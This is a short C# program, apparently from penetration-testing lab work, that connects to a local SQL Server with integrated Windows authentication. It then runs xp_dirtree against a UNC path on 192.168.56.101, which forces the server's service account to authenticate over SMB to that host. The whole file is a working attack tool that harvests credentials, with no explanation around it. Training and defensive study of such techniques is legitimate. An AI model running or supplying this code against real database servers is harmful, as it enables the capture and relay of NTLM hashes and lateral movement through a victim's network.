using System;
using System.Data.SqlClient;

namespace UNC_Path_Injection
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "localhost";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String uncquery = "EXEC master..xp_dirtree \"\\\\192.168.56.101\\\\test\";";
            SqlCommand command = new SqlCommand(uncquery, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            con.Close();
        }
    }
}
